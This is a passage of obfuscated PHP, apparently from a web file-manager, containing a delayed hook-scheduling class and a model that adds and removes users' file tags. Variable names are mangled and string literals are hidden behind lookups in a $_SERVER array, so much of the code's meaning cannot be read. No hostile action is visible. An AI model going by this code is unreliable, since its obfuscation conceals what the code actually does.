timeFloat(), $³–ÀÂ¨Ğ * 10); return !0; } return !1; } public static function timeLimitCall($ªÇôƒä, $³€ùÖñÓ, $°‰…ØË, $óæ‘¥’Œ = 5.0) { $üµÙ²Ñ =& $_SERVER[ Ö‘ñÄ”]; if (!$ªÇôƒä || !$³€ùÖñÓ) { return; } self::$asyncAdd = !0; $ˆÀĞùöØ = $üµÙ²Ñ[1749]; $¬¯ìûÎ¶ = Cache::get($ˆÀĞùöØ, !0); $ëÉ¨ø— = array($üµÙ²Ñ[1750] => timeFloat(), $üµÙ²Ñ[1751] => timeFloat(), $üµÙ²Ñ[273] => $³€ùÖñÓ, $üµÙ²Ñ[1744] => $°‰…ØË, $üµÙ²Ñ[203] => $óæ‘¥’Œ); if (is_array($¬¯ìûÎ¶[$ªÇôƒä])) { $ëÉ¨ø—[$üµÙ²Ñ[1751]] = $¬¯ìûÎ¶[$ªÇôƒä][$üµÙ²Ñ[1751]]; } if (is_array($¬¯ìûÎ¶[$ªÇôƒä])) { if (timeFloat() - $¬¯ìûÎ¶[$ªÇôƒä][$üµÙ²Ñ[1750]] < $ëÉ¨ø—[$üµÙ²Ñ[203]] * 0.3) { return; } $ëÉ¨ø—[$üµÙ²Ñ[1751]] = $¬¯ìûÎ¶[$ªÇôƒä][$üµÙ²Ñ[1751]]; } $¬¯ìûÎ¶[$ªÇôƒä] = $ëÉ¨ø—; Cache::set($ˆÀĞùöØ, $¬¯ìûÎ¶, 60); Cache::removeMemory($ˆÀĞùöØ); write_log($üµÙ²Ñ[1752] . $ªÇôƒä . $üµÙ²Ñ[71] . $³€ùÖñÓ, $üµÙ²Ñ[1746]); } public static function timeLimitCallLoop() { $³Â”¸‘š =& $_SERVER[ Ö‘ñÄ”]; $ÅÅåÇ­ä = array($³Â”¸‘š[1753]); $„‚²“çş = in_array(strtolower(ACTION), $ÅÅåÇ­ä); if (!$„‚²“çş && !self::$asyncAdd) { return; } $ìÌ·¦›ë = $³Â”¸‘š[1749]; $Ÿœ ­”† = Cache::get($ìÌ·¦›ë, !0); if (!$Ÿœ ­”† || count($Ÿœ ­”†) <= 0) { return; } $şóèã­ = !1; $¸Ì›¥Éª = timeFloat(); $Ÿ­µó = array(); foreach ($Ÿœ ­”† as $í•˜Éñ => $šîñğáä) { if ($¸Ì›¥Éª - $šîñğáä[$³Â”¸‘š[1751]] > $šîñğáä[$³Â”¸‘š[203]]) { $şóèã­ = !0; try { Hook::apply($šîñğáä[$³Â”¸‘š[273]], $šîñğáä[$³Â”¸‘š[1744]]); write_log($³Â”¸‘š[1754] . $í•˜Éñ . $³Â”¸‘š[71] . $šîñğáä[$³Â”¸‘š[273]] . $³Â”¸‘š[1755] . ACTION, $³Â”¸‘š[1746]); } catch (Exception $­ıôÛØñ) { } continue; } $Ÿ­µó[$í•˜Éñ] = $šîñğáä; } if (!$şóèã­) { return; } if (!$Ÿ­µó) { return Cache::remove($ìÌ·¦›ë); } Cache::set($ìÌ·¦›ë, $Ÿ­µó, 60); Cache::removeMemory($ìÌ·¦›ë); } public static function finished($àŠ–©ğİ, $³Áóïö) { $Şüßüº =& $_SERVER[ Ö‘ñÄ”]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Şüßüº[273] => $àŠ–©ğİ, $Şüßüº[1744] => $³Áóïö); } private static function finishedRun() { $ŞíÖ¬Ù– =& $_SERVER[ Ö‘ñÄ”]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ù–¿×ã) { try { Hook::apply($ù–¿×ã[$ŞíÖ¬Ù–[273]], $ù–¿×ã[$ŞíÖ¬Ù–[1744]]); } catch (Exception $ÂíÏÑò¼) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto E¾°Õã®¬“; d•‡³˜Ë¢: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($‰€¾“) { $Ñ£İâ¯ =& $_SERVER[ Ö‘ñÄ”]; return array($Ñ£İâ¯[1947] => array($Ñ£İâ¯[2328] . USER_ID, $Ñ£İâ¯[1948])); } protected function listData() { $·Ò·‚Œû =& $_SERVER[ Ö‘ñÄ”]; $şÇçşÀˆ = array($·Ò·‚Œû[1654] => USER_ID, $·Ò·‚Œû[492] => array($·Ò·‚Œû[1951], 0)); $¸¤†ÕÎë = $·Ò·‚Œû[2329]; $îº¸¨£á = $this->field($¸¤†ÕÎë)->where($şÇçşÀˆ)->order($·Ò·‚Œû[1954])->select(); return $îº¸¨£á ? $îº¸¨£á : array(); } protected function addToTag($úËĞ¾£˜, $÷«Ô¤ç”) { $úøõüüØ =& $_SERVER[ Ö‘ñÄ”]; if (!Model($úøõüüØ[2091])->listData($÷«Ô¤ç”)) { return !1; } if (is_numeric($úËĞ¾£˜)) { $ÉéïÓÕ§ = Model($úøõüüØ[838])->pathInfo($úËĞ¾£˜); if (!$ÉéïÓÕ§) { return !1; } } else { $ÉéïÓÕ§ = IO::infoSimple($úËĞ¾£˜); if (!$ÉéïÓÕ§) { return !1; } $ëåÇÂä = $ÉéïÓÕ§[$úøõüüØ[32]]; $Ñ„’™à§ = $ÉéïÓÕ§[$úøõüüØ[33]]; if (isset($ÉéïÓÕ§[$úøõüüØ[418]])) { $Ñ„’™à§ = $ÉéïÓÕ§[$úøõüüØ[418]] == $úøõüüØ[88] ? $úøõüüØ[75] : $úøõüüØ[199]; } } $å±±¼å = array($úøõüüØ[1654] => USER_ID, $úøõüüØ[492] => $÷«Ô¤ç”, $úøõüüØ[429] => $úËĞ¾£˜, $úøõüüØ[430] => $Ñ„’™à§ ? $Ñ„’™à§ : $úøõüüØ[424], $úøõüüØ[428] => $ëåÇÂä ? $ëåÇÂä : $úøõüüØ[12], $úøõüüØ[1840] => 0); if ($this->where($å±±¼å)->find()) { return !1; } return $this->add($å±±¼å); } protected function removeFromTag($™ ¨½Ò, $Š§Œ¹î›) { $İÃçæ‰¿ =& $_SERVER[ Ö‘ñÄ”]; if (!Model($İÃçæ‰¿[2091])->listData($Š§Œ¹î›)) { return !1; } if (is_array($™ ¨½Ò)) { $™ ¨½Ò = array($İÃçæ‰¿[7], $™ ¨½Ò); } $ÔöáâÙ™ = array($İÃçæ‰¿[1654] => USER_ID, $İÃçæ‰¿[492] => $Š§Œ¹î›, $İÃçæ‰¿[429] => $™ ¨½Ò); return $this->where($ÔöáâÙ™)->delete(); } protected function removeByTag($ª±·¼¼‰) { $·ê¼Ú¶ =& $_SERVER[ Ö‘ñÄ”]; if (!$ª±·¼¼‰) { return !1; } $Ş¨¼ëÆ = array($·ê¼Ú¶[1654] => USER_ID, $·ê¼Ú¶[492] => $ª±·¼¼‰); return $this->where($Ş¨¼ëÆ)->delete(); } protected function removeBySource($Ë¯Ãñ) { $Ä·âøÜ =& $_SERVER[ Ö‘ñÄ”]; if (is_array($Ë¯Ãñ)) { $Ë¯Ãñ = array($Ä·âøÜ[7], $Ë¯Ãñ); } $øªÂÒô = array($Ä·âøÜ[1654] => USER_ID, $Ä·âøÜ[492] => array($Ä·âøÜ[1020], 0), $Ä·âøÜ[429] => $Ë¯Ãñ); return $this->where($øªÂÒô)->delete(); } }